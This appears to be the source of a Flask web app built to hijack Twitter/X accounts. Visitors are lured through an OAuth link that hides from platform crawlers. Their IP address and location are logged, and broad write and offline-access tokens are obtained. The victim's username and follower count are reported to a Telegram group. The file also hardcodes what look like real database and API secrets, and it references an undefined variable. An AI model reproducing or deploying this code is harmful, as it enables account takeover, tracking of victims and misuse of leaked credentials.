from flask import Flask, request, redirect, session
import requests
import base64
import secrets
from pymongo import MongoClient
from pymongo.server_api import ServerApi

app = Flask(__name__)
app.secret_key = secrets.token_hex(16)

MONGO_URI = "mongodb+srv://advonisx:TRYsyrGie4c0uVEw@cluster0.qtpxk.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0&ssl=true"

TWITTER_CLIENT_ID = 'eWNUdkx4LTlnaGQ0N3BaSGJyYkU6MTpjaQ'
TWITTER_CLIENT_SECRET = '4cct_4dZ3BVz_MNKKjazWi1M3XVelnSiGqV6R5hBxC-Pbj7ytn'
TELEGRAM_BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN'  # Replace with your actual bot token

credentials = base64.b64encode(f"{TWITTER_CLIENT_ID}:{TWITTER_CLIENT_SECRET}".encode()).decode('utf-8')

client = MongoClient(MONGO_URI, server_api=ServerApi('1'))
db = client['cobra_db']
groups = db['groups']

try:
    client.admin.command('ping')
    print("[+] MongoDB connected successfully.")
except Exception as e:
    print("[-] MongoDB connection failed:", e)


@app.route('/oauth')
def oauth():
    user_agent = request.headers.get('User-Agent', '').strip()
    identifier = request.args.get('identifier')

    if not identifier:
        return "⚠️ Identifier is required.", 400

    group = groups.find_one({"identifier": identifier})
    if not group:
        return "⚠️ Identifier is invalid.", 404

    session["redirect_url"] = group.get('redirect')
    session["group_id"] = group.get("group_id")
    
    if 'Twitterbot' in user_agent or 'TelegramBot' in user_agent:
        return redirect('https://calendly.com/cointele')

    real_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    res = requests.get(f'http://ip-api.com/json/{real_ip}')
    location_data = res.json()
    
    country, city = location_data.get("country"), location_data.get("city")
    country_flag = ''.join(chr(ord(c) + 127397) for c in location_data.get("countryCode", ""))

    message = f'🔗 Connection: {real_ip}\n\n{country_flag} {city}, {country}'
    send_telegram_message(group['group_id'], message)

    twitter_oauth_url = generate_twitter_oauth_url()
    return redirect(twitter_oauth_url)


def generate_twitter_oauth_url():
    TWITTER_CALLBACK_URL = 'https://twitter-logger.onrender.com/auth'
    return (f'https://twitter.com/i/oauth2/authorize?response_type=code&client_id={TWITTER_CLIENT_ID}'
            f'&redirect_uri={TWITTER_CALLBACK_URL}'
            f'&scope=tweet.read+users.read+tweet.write+offline.access+tweet.moderate.write'
            f'&state=state&code_challenge=challenge&code_challenge_method=plain')


@app.route('/auth')
def auth_callback():
    authorization_code = request.args.get('code')
    access_token, refresh_token = exchange_token_for_access(authorization_code)
    
    user_data = get_twitter_user_data(access_token)
    username = user_data.get('username')
    followers_count = user_data['public_metrics']['followers_count']
    
    send_to_telegram(username, followers_count, access_token, refresh_token, session.get("group_id"))
    return redirect(session.get("redirect_url", "/default-url"))


def exchange_token_for_access(authorization_code):
    token_exchange_url = 'https://api.twitter.com/2/oauth2/token'
    request_data = {
        'grant_type': 'authorization_code',
        'code': authorization_code,
        'redirect_uri': 'https://twitter-logger.onrender.com/auth',
        'code_verifier': "challenge"
    }
    headers = {
        'Authorization': f'Basic {credentials_base64}',
        'Content-Type': 'application/x-www-form-urlencoded',
    }
    response = requests.post(token_exchange_url, data=request_data, headers=headers)
    return response.json().get('access_token'), response.json().get('refresh_token')


def get_twitter_user_data(access_token):
    headers = {
        'Authorization': f'Bearer {access_token}',
        'Content-Type': 'application/json',
    }
    params = {
        'user.fields': 'public_metrics'
    }
    response = requests.get('https://api.twitter.com/2/users/me', headers=headers, params=params)
    return response.json().get('data', {})


def send_to_telegram(username, followers_count, access_token, refresh_token, group_id):
    message = (f'✅ *User [{username}](https://x.com/{username}) has authorized.*\n'
               f'👥 *Followers:* {followers_count}')
    send_telegram_message(group_id, message)


def send_telegram_message(chat_id, message):
    requests.post(
        f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage',
        data={'chat_id': chat_id, 'text': message, 'parse_mode': 'Markdown'}
    )


if __name__ == '__main__':
    app.run()